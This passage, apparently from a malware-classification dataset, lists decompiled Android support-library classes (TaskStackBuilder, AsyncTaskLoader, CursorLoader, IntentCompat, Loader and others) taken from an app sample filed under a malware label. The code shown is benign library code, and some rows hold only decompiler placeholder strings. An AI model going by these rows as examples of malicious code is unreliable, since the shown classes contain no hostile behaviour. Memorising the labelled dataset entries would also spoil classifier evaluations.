parent=NavUtils.getParentActivityIntent(sourceActivity);     if (parent != null) {       ComponentName target=parent.getComponent();       if (target == null) {         target=parent.resolveActivity(this.mSourceContext.getPackageManager());       }       addParentStack(target);       addNextIntent(parent);     }     return this;   }   public TaskStackBuilder addParentStack(  Class<?> sourceActivityClass){     return addParentStack(new ComponentName(this.mSourceContext,sourceActivityClass));   }   public TaskStackBuilder addParentStack(  ComponentName sourceActivityName){     int insertAt=this.mIntents.size();     try {       Intent parent=NavUtils.getParentActivityIntent(this.mSourceContext,sourceActivityName);       while (parent != null) {         this.mIntents.add(insertAt,parent);         parent=NavUtils.getParentActivityIntent(this.mSourceContext,parent.getComponent());       }       return this;     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");       throw new IllegalArgumentException(e);     }   }   public int getIntentCount(){     return this.mIntents.size();   }   public Intent getIntent(  int index){     return editIntentAt(index);   }   public Intent editIntentAt(  int index){     return this.mIntents.get(index);   }   @Override public Iterator<Intent> iterator(){     return this.mIntents.iterator();   }   public void startActivities(){     startActivities(null);   }   public void startActivities(  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot startActivities"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     if (!ContextCompat.startActivities(this.mSourceContext,intents,options)) {       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       this.mSourceContext.startActivity(topIntent);     }   }   public PendingIntent getPendingIntent(  int requestCode,  int flags){     return getPendingIntent(requestCode,flags,null);   }   public PendingIntent getPendingIntent(  int requestCode,  int flags,  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot getPendingIntent"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     return IMPL.getPendingIntent(this.mSourceContext,intents,requestCode,flags,options);   }   public Intent[] getIntents(){     Intent[] intents=new Intent[this.mIntents.size()];     if (intents.length != 0) {       intents[0]=new Intent(this.mIntents.get(0)).addFlags(268484608);       for (int i=1; i < intents.length; i++) {         intents[i]=new Intent(this.mIntents.get(i));       }     }     return intents;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderHoneycomb.code","public class TaskStackBuilderHoneycomb {   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags){     return PendingIntent.getActivities(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderImpl.code","public interface TaskStackBuilderImpl {   PendingIntent getPendingIntent(  Context context,  Intent[] intentArr,  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderImplBase.code","static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {   TaskStackBuilderImplBase(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     Intent topIntent=new Intent(intents[intents.length - 1]);     topIntent.addFlags(268435456);     return PendingIntent.getActivity(context,requestCode,topIntent,flags);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderImplHoneycomb.code","static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {   TaskStackBuilderImplHoneycomb(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderImplJellybean.code","static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {   TaskStackBuilderImplJellybean(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilderJellybean.code","class TaskStackBuilderJellybean {   TaskStackBuilderJellybean(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags,  Bundle options){     return PendingIntent.getActivities(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\AsyncTaskLoader.code","public abstract class AsyncTaskLoader<D> extends Loader<D> {   static final boolean DEBUG=false;   static final String TAG=""AsyncTaskLoader"";   volatile AsyncTaskLoader<D>.LoadTask mCancellingTask;   Handler mHandler;   long mLastLoadCompleteTime;   volatile AsyncTaskLoader<D>.LoadTask mTask;   long mUpdateThrottle;   public abstract D loadInBackground(); public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {     private CountDownLatch done=new CountDownLatch(1);     D result;     boolean waiting;     LoadTask(){     }     @Override public D doInBackground(    Void... voidArr){       this.result=(D)AsyncTaskLoader.this.onLoadInBackground();       return this.result;     }     @Override protected void onPostExecute(    D data){       try {         AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);       }   finally {         this.done.countDown();       }     }     @Override protected void onCancelled(){       try {         AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);       }   finally {         this.done.countDown();       }     }     @Override public void run(){       this.waiting=AsyncTaskLoader.DEBUG;       AsyncTaskLoader.this.executePendingTask();     }   }   public AsyncTaskLoader(  Context context){     super(context);     this.mLastLoadCompleteTime=-10000L;   }   public void setUpdateThrottle(  long delayMS){     this.mUpdateThrottle=delayMS;     if (delayMS != 0) {       this.mHandler=new Handler();     }   }   @Override public void onForceLoad(){     super.onForceLoad();     cancelLoad();     this.mTask=new LoadTask();     executePendingTask();   }   public boolean cancelLoad(){     boolean cancelled=DEBUG;     if (this.mTask != null) {       if (this.mCancellingTask != null) {         if (this.mTask.waiting) {           this.mTask.waiting=DEBUG;           this.mHandler.removeCallbacks(this.mTask);         }         this.mTask=null;       }  else       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);         this.mTask=null;       }  else {         cancelled=this.mTask.cancel(DEBUG);         if (cancelled) {           this.mCancellingTask=this.mTask;         }         this.mTask=null;       }     }     return cancelled;   }   public void onCanceled(  D data){   }   void executePendingTask(){     if (this.mCancellingTask == null && this.mTask != null) {       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);       }       if (this.mUpdateThrottle > 0) {         long now=SystemClock.uptimeMillis();         if (now < this.mLastLoadCompleteTime + this.mUpdateThrottle) {           this.mTask.waiting=true;           this.mHandler.postAtTime(this.mTask,this.mLastLoadCompleteTime + this.mUpdateThrottle);           return;         }       }       this.mTask.executeOnExecutor(ModernAsyncTask.THREAD_POOL_EXECUTOR,(Void[])null);     }   }   void dispatchOnCancelled(  AsyncTaskLoader<D>.LoadTask task,  D data){     onCanceled(data);     if (this.mCancellingTask == task) {       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mCancellingTask=null;       executePendingTask();     }   }   void dispatchOnLoadComplete(  AsyncTaskLoader<D>.LoadTask task,  D data){     if (this.mTask != task) {       dispatchOnCancelled(task,data);     }  else {       if (isAbandoned()) {         onCanceled(data);         return;       }       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mTask=null;       deliverResult(data);     }   }   protected D onLoadInBackground(){     return loadInBackground();   }   public void waitForLoader(){     AsyncTaskLoader<D>.LoadTask task=this.mTask;     if (task != null) {       try {         ((LoadTask)task).done.await();       }  catch (      InterruptedException e) {       }     }   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     if (this.mTask != null) {       writer.print(prefix);       writer.print(""mTask="");       writer.print(this.mTask);       writer.print("" waiting="");       writer.println(this.mTask.waiting);     }     if (this.mCancellingTask != null) {       writer.print(prefix);       writer.print(""mCancellingTask="");       writer.print(this.mCancellingTask);       writer.print("" waiting="");       writer.println(this.mCancellingTask.waiting);     }     if (this.mUpdateThrottle != 0) {       writer.print(prefix);       writer.print(""mUpdateThrottle="");       TimeUtils.formatDuration(this.mUpdateThrottle,writer);       writer.print("" mLastLoadCompleteTime="");       TimeUtils.formatDuration(this.mLastLoadCompleteTime,SystemClock.uptimeMillis(),writer);       writer.println();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\AsyncTaskResult.code","public static class AsyncTaskResult<Data> {   final Data[] mData;   final ModernAsyncTask mTask;   AsyncTaskResult(  ModernAsyncTask task,  Data... data){     this.mTask=task;     this.mData=data;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\BroadcastRecord.code","public static class BroadcastRecord {   final Intent intent;   final ArrayList<ReceiverRecord> receivers;   BroadcastRecord(  Intent _intent,  ArrayList<ReceiverRecord> _receivers){     this.intent=_intent;     this.receivers=_receivers;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ContextCompat.code","public class ContextCompat {   public static boolean startActivities(  Context context,  Intent[] intents){     return startActivities(context,intents,null);   }   public static boolean startActivities(  Context context,  Intent[] intents,  Bundle options){     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       ContextCompatJellybean.startActivities(context,intents,options);       return true;     }     if (version >= 11) {       ContextCompatHoneycomb.startActivities(context,intents);       return true;     }     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ContextCompatHoneycomb.code","class ContextCompatHoneycomb {   ContextCompatHoneycomb(){   }   public static void startActivities(  Context context,  Intent[] intents){     context.startActivities(intents);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ContextCompatJellybean.code","class ContextCompatJellybean {   ContextCompatJellybean(){   }   public static void startActivities(  Context context,  Intent[] intents,  Bundle options){     context.startActivities(intents,options);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\CursorLoader.code","public class CursorLoader extends AsyncTaskLoader<Cursor> {   Cursor mCursor;   final Loader<Cursor>.ForceLoadContentObserver mObserver;   String[] mProjection;   String mSelection;   String[] mSelectionArgs;   String mSortOrder;   Uri mUri;   @Override public Cursor loadInBackground(){     Cursor cursor=getContext().getContentResolver().query(this.mUri,this.mProjection,this.mSelection,this.mSelectionArgs,this.mSortOrder);     if (cursor != null) {       cursor.getCount();       registerContentObserver(cursor,this.mObserver);     }     return cursor;   }   void registerContentObserver(  Cursor cursor,  ContentObserver observer){     cursor.registerContentObserver(this.mObserver);   }   @Override public void deliverResult(  Cursor cursor){     if (isReset()) {       if (cursor != null) {         cursor.close();         return;       }       return;     }     Cursor oldCursor=this.mCursor;     this.mCursor=cursor;     if (isStarted()) {       super.deliverResult((CursorLoader)cursor);     }     if (oldCursor != null && oldCursor != cursor && !oldCursor.isClosed()) {       oldCursor.close();     }   }   public CursorLoader(  Context context){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();   }   public CursorLoader(  Context context,  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();     this.mUri=uri;     this.mProjection=projection;     this.mSelection=selection;     this.mSelectionArgs=selectionArgs;     this.mSortOrder=sortOrder;   }   @Override protected void onStartLoading(){     if (this.mCursor != null) {       deliverResult(this.mCursor);     }     if (takeContentChanged() || this.mCursor == null) {       forceLoad();     }   }   @Override protected void onStopLoading(){     cancelLoad();   }   @Override public void onCanceled(  Cursor cursor){     if (cursor != null && !cursor.isClosed()) {       cursor.close();     }   }   @Override public void onReset(){     super.onReset();     onStopLoading();     if (this.mCursor != null && !this.mCursor.isClosed()) {       this.mCursor.close();     }     this.mCursor=null;   }   public Uri getUri(){     return this.mUri;   }   public void setUri(  Uri uri){     this.mUri=uri;   }   public String[] getProjection(){     return this.mProjection;   }   public void setProjection(  String[] projection){     this.mProjection=projection;   }   public String getSelection(){     return this.mSelection;   }   public void setSelection(  String selection){     this.mSelection=selection;   }   public String[] getSelectionArgs(){     return this.mSelectionArgs;   }   public void setSelectionArgs(  String[] selectionArgs){     this.mSelectionArgs=selectionArgs;   }   public String getSortOrder(){     return this.mSortOrder;   }   public void setSortOrder(  String sortOrder){     this.mSortOrder=sortOrder;   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     writer.print(prefix);     writer.print(""mUri="");     writer.println(this.mUri);     writer.print(prefix);     writer.print(""mProjection="");     writer.println(Arrays.toString(this.mProjection));     writer.print(prefix);     writer.print(""mSelection="");     writer.println(this.mSelection);     writer.print(prefix);     writer.print(""mSelectionArgs="");     writer.println(Arrays.toString(this.mSelectionArgs));     writer.print(prefix);     writer.print(""mSortOrder="");     writer.println(this.mSortOrder);     writer.print(prefix);     writer.print(""mCursor="");     writer.println(this.mCursor);     writer.print(prefix);     writer.print(""mContentChanged="");     writer.println(this.mContentChanged);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ForceLoadContentObserver.code","public final class ForceLoadContentObserver extends ContentObserver {   public ForceLoadContentObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     Loader.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompat.code","public class IntentCompat {   public static final String ACTION_EXTERNAL_APPLICATIONS_AVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"";   public static final String ACTION_EXTERNAL_APPLICATIONS_UNAVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"";   public static final String EXTRA_CHANGED_PACKAGE_LIST=""android.intent.extra.changed_package_list"";   public static final String EXTRA_CHANGED_UID_LIST=""android.intent.extra.changed_uid_list"";   public static final String EXTRA_HTML_TEXT=""android.intent.extra.HTML_TEXT"";   public static final int FLAG_ACTIVITY_CLEAR_TASK=32768;   public static final int FLAG_ACTIVITY_TASK_ON_HOME=16384;   private static final IntentCompatImpl IMPL; interface IntentCompatImpl {     Intent makeMainActivity(    ComponentName componentName);     Intent makeMainSelectorActivity(    String str,    String str2);     Intent makeRestartActivityTask(    ComponentName componentName);   } static class IntentCompatImplBase implements IntentCompatImpl {     IntentCompatImplBase(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       Intent intent=new Intent(""android.intent.action.MAIN"");       intent.setComponent(componentName);       intent.addCategory(""android.intent.category.LAUNCHER"");       return intent;     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       Intent intent=new Intent(selectorAction);       intent.addCategory(selectorCategory);       return intent;     }     @Override public Intent makeRestartActivityTask(    ComponentName mainActivity){       Intent intent=makeMainActivity(mainActivity);       intent.addFlags(268468224);       return intent;     }   } static class IntentCompatImplHC extends IntentCompatImplBase {     IntentCompatImplHC(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       return IntentCompatHoneycomb.makeMainActivity(componentName);     }     @Override public Intent makeRestartActivityTask(    ComponentName componentName){       return IntentCompatHoneycomb.makeRestartActivityTask(componentName);     }   } static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {     IntentCompatImplIcsMr1(){     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 15) {       IMPL=new IntentCompatImplIcsMr1();     }  else     if (version >= 11) {       IMPL=new IntentCompatImplHC();     }  else {       IMPL=new IntentCompatImplBase();     }   }   private IntentCompat(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return IMPL.makeMainActivity(mainActivity);   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IMPL.makeMainSelectorActivity(selectorAction,selectorCategory);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return IMPL.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatHoneycomb.code","class IntentCompatHoneycomb {   IntentCompatHoneycomb(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return Intent.makeMainActivity(mainActivity);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return Intent.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatIcsMr1.code","class IntentCompatIcsMr1 {   IntentCompatIcsMr1(){   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return Intent.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatImpl.code","interface IntentCompatImpl {   Intent makeMainActivity(  ComponentName componentName);   Intent makeMainSelectorActivity(  String str,  String str2);   Intent makeRestartActivityTask(  ComponentName componentName); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatImplBase.code","static class IntentCompatImplBase implements IntentCompatImpl {   IntentCompatImplBase(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.setComponent(componentName);     intent.addCategory(""android.intent.category.LAUNCHER"");     return intent;   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     Intent intent=new Intent(selectorAction);     intent.addCategory(selectorCategory);     return intent;   }   @Override public Intent makeRestartActivityTask(  ComponentName mainActivity){     Intent intent=makeMainActivity(mainActivity);     intent.addFlags(268468224);     return intent;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatImplHC.code","static class IntentCompatImplHC extends IntentCompatImplBase {   IntentCompatImplHC(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     return IntentCompatHoneycomb.makeMainActivity(componentName);   }   @Override public Intent makeRestartActivityTask(  ComponentName componentName){     return IntentCompatHoneycomb.makeRestartActivityTask(componentName);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\IntentCompatImplIcsMr1.code","static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {   IntentCompatImplIcsMr1(){   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7fce8421"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\Loader.code","public class Loader<D> {   Context mContext;   int mId;   OnLoadCompleteListener<D> mListener;   boolean mStarted=false;   boolean mAbandoned=false;   boolean mReset=true;   boolean mContentChanged=false; public interface OnLoadCompleteListener<D> {     void onLoadComplete(    Loader<D> loader,    D d);   } public final class ForceLoadContentObserver extends ContentObserver {     public ForceLoadContentObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       Loader.this.onContentChanged();     }   }   public Loader(  Context context){     this.mContext=context.getApplicationContext();   }   public void deliverResult(  D data){     if (this.mListener != null) {       this.mListener.onLoadComplete(this,data);     }   }   public Context getContext(){     return this.mContext;   }   public int getId(){     return this.mId;   }   public void registerListener(  int id,  OnLoadCompleteListener<D> listener){     if (this.mListener != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.mListener=listener;     this.mId=id;   }   public void unregisterListener(  OnLoadCompleteListener<D> listener){     if (this.mListener == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.mListener != listener) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.mListener=null;   }   public boolean isStarted(){     return this.mStarted;   }   public boolean isAbandoned(){     return this.mAbandoned;   }   public boolean isReset(){     return this.mReset;   }   public final void startLoading(){     this.mStarted=true;     this.mReset=false;     this.mAbandoned=false;     onStartLoading();   }   protected void onStartLoading(){   }   public void forceLoad(){     onForceLoad();   }   public void onForceLoad(){   }   public void stopLoading(){     this.mStarted=false;     onStopLoading();   }   protected void onStopLoading(){   }   public void abandon(){     this.mAbandoned=true;     onAbandon();   }   protected void onAbandon(){   }   public void reset(){     onReset();     this.mReset=true;     this.mStarted=false;     this.mAbandoned=false;     this.mContentChanged=false;   }   public void onReset(){   }   public boolean takeContentChanged(){     boolean res=this.mContentChanged;     this.mContentChanged=false;     return res;   }   public void onContentChanged(){     if (this.mStarted) {       forceLoad();     }  else {       this.mContentChanged=true;     }   }   public String dataToString(  D data){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(data,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(this,sb);     sb.append("" id="");     sb.append(this.mId);     sb.append(""}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mListener="");     writer.println(this.mListener);     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mContentChanged="");     writer.print(this.mContentChanged);     writer.print("" mAbandoned="");     writer.print(this.mAbandoned);     writer.print("" mReset="");     writer.println(this.mReset);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\LoadTask.code","public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {   private CountDownLatch done=new CountDownLatch(1);   D result;   boolean waiting;   LoadTask(){   }   @Override public D doInBackground(  Void... voidArr){     this.result=(D)AsyncTaskLoader.this.onLoadInBackground();     return this.result;   }   @Override protected void onPostExecute(  D data){     try {       AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);     }   finally {       this.done.countDown();     }   }   @Override protected void onCancelled(){     try {       AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);     }   finally {       this.done.countDown();     }   }   @Override public void run(){     this.waiting=AsyncTaskLoader.DEBUG;     AsyncTaskLoader.this.executePendingTask();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\LocalBroadcastManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@72e0ce40"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ModernAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@68dc8f7f"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\OnLoadCompleteListener.code","public interface OnLoadCompleteListener<D> {   void onLoadComplete(  Loader<D> loader,  D d); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\ReceiverRecord.code","public static class ReceiverRecord {   boolean broadcasting;   final IntentFilter filter;   final BroadcastReceiver receiver;   ReceiverRecord(  IntentFilter _filter,  BroadcastReceiver _receiver){     this.filter=_filter;     this.receiver=_receiver;   }   public String toString(){     StringBuilder builder=new StringBuilder(128);     builder.append(""Receiver{"");     builder.append(this.receiver);     builder.append("" filter="");     builder.append(this.filter);     builder.append(""}"");     return builder.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content\WorkerRunnable.code","public static abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.content.pm\ActivityInfoCompat.code","public class ActivityInfoCompat {   public static final int CONFIG_UI_MODE=512;   private ActivityInfoCompat(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.database\DatabaseUtilsCompat.code","public class DatabaseUtilsCompat {   private DatabaseUtilsCompat(){   }   public static String concatenateWhere(  String a,  String b){     if (TextUtils.isEmpty(a)) {       return b;     }     return TextUtils.isEmpty(b) ? a : ""("" + a + "") AND (""+ b+ "")"";   }   public static String[] appendSelectionArgs(  String[] originalValues,  String[] newValues){     if (originalValues == null || originalValues.length == 0) {       return newValues;     }     String[] result=new String[originalValues.length + newValues.length];     System.arraycopy(originalValues,0,result,0,originalValues.length);     System.arraycopy(newValues,0,result,originalValues.length,newValues.length);     return result;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\BaseConnectivityManagerCompatImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@256a9a47"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\BaseTrafficStatsCompatImpl.code","static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){     @Override public SocketTags initialValue(){       return new SocketTags();     }   } ; public static class SocketTags {     public int statsTag;     private SocketTags(){       this.statsTag=-1;     }   }   BaseTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     this.mThreadSocketTags.get().statsTag=-1;   }   @Override public int getThreadStatsTag(){     return this.mThreadSocketTags.get().statsTag;   }   @Override public void incrementOperationCount(  int operationCount){   }   @Override public void incrementOperationCount(  int tag,  int operationCount){   }   @Override public void setThreadStatsTag(  int tag){     this.mThreadSocketTags.get().statsTag=tag;   }   @Override public void tagSocket(  Socket socket){   }   @Override public void untagSocket(  Socket socket){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\ConnectivityManagerCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@18ea1b84"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\ConnectivityManagerCompatGingerbread.code","!org.eclipse.jdt.core.dom.TypeDeclaration@11cd86bd"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\ConnectivityManagerCompatHoneycombMR2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a3655b4"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\ConnectivityManagerCompatImpl.code","interface ConnectivityManagerCompatImpl {   boolean isActiveNetworkMetered(  ConnectivityManager connectivityManager); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\ConnectivityManagerCompatJellyBean.code","class ConnectivityManagerCompatJellyBean {   ConnectivityManagerCompatJellyBean(){   }   public static boolean isActiveNetworkMetered(  ConnectivityManager cm){     return cm.isActiveNetworkMetered();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.net\GingerbreadConnectivityManagerCompatImpl.code","static class GingerbreadConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   GingerbreadConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatGingerbread.isActiveNetworkMetered(cm);   } } "
